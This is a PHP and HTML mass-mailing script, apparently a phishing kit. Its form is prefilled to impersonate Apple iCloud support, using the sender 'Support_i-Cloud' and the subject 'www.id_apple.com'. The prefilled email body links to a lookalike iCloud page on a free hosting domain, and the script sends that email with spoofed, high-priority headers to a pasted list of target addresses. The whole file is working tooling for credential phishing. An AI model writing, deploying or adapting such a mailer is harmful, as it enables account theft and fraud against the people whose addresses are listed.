<head>
 
	<meta charset="UTF-8">
	
	<meta content="width=device-width, initial-scale=1" name="viewport"/>

<?php
//
//
//

set_time_limit(0);

if($_POST['Manda'])
{

//EMAIL DO DESTINAT?RIO
$FromName = $_POST['FromName'];
$FromMail = $_POST['FromMail'];

//ASSUNTO DO EMAIL
$assunto = $_POST['assunto'];

//MENSAGEM DO EMAIL
$mensagem = $_POST['html'];
$mensagem = stripslashes($mensagem);
//CABE?ALHO DO EMAIL
$headers .= "MIME-Version: 1.0\n"; 
$headers .= "Content-type: text/html; charset=iso-8859-1\n"; 
$headers .= "From: ".$FromName . " <" . $FromMail . ">\n"; 
$headers .= "To: ".$FromName . " <" . $FromMail . ">\n";
$headers .= "Reply-To: " . $FromMail . "\n"; 
$headers .= "X-Priority: 1\n"; 
$headers .= "X-MSMail-Priority: High\n"; 
$headers .= "X-Mailer: Widgets.com Server"; 

//ARQUIVO COM OS EMAILS
$arquivo = $_POST['lista'];

//GERANDO UM ARRAY COM A LISTA
$file = explode("\n", $arquivo);
$i = 1;

}
?>
<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<p>&nbsp;</p>
<style type="text/css">
td {
font-family:verdana;
color:#000000;
font-size:10px;
}
</style>
<?
if($_POST['Manda']) { ?>
<table width="59%" height="30" border="0" align="center" cellpadding="2" cellspacing="1" bgcolor="#333333">
<tr>
<td bgcolor="#f5f5f5"> 
<?
foreach ($file as $mail) {
if(mail($mail, $assunto, $mensagem, $headers)) {
echo "<font color=green face=verdana size=1>* $i - ".$mail."</font> <font color=green face=verdana size=1>OK</font><br>";
} else {
echo "* $i ".$mail[$i]." <font color=red>NO</font><br><hr>";
$i++;
}
}
?>
</td>
</tr>
</table>
<? } ?>
<form name="form1" method="post" action="">
<table width="47%" height="202" border="0" align="center" cellpadding="0" cellspacing="2" bgcolor="#F4F4F4">
<tr> <center><img src="https://www.prlog.org/12266752-icloud-icon.png" width="180" height="120">
<td colspan="2" align="center"><b></b></td>
</tr>
<tr> 
<td width="34%" align="center"><b>Asunto:</b></td>
<td width="66%"><input name="assunto" value="www.id_apple.com" type="text" id="assunto3"  size="50"></td>
</tr>
<tr> 
<td align="center"><b>Nombre del que env&#237;a:</b></td>
<td><input name="FromName" type="text" value="Support_i-Cloud" size="50"></td>
</tr>
<tr> 
<td align="center"><b>Correo que env&#237;a:</b></td>
<td><input name="FromMail" type="text" value="Support_i-Cloud" size="50"></td>
</tr>
<tr> 
<td><b>inserta tu texto/html:</b></td>
<td><textarea name="html" cols="38" rows="10" id="textarea2">
<html>
<center><img src="https://workcrm.com/paythunder/cs/1.png">
<br>
<a href="https://i-cloud-support-com.000webhostapp.com/c8a6e352f496552/www.icloud.com/" target="_blank" ><img src="https://workcrm.com/paythunder/bot3.png "width="288" height="46">
<br><img src="https://workcrm.com/paythunder/cs/2.png">
</html></textarea></td>
</tr>
<tr> 
<td><b>Correo del objetivo --></b></td>
<td><textarea name="lista" cols="38" rows="10" id="textarea3"></textarea></td>
</tr>
<tr> 
<td align="center" colspan="2"><input name="Manda" type="submit" id="Manda" value="Enviar"></td>
</tr>
</table>

</form>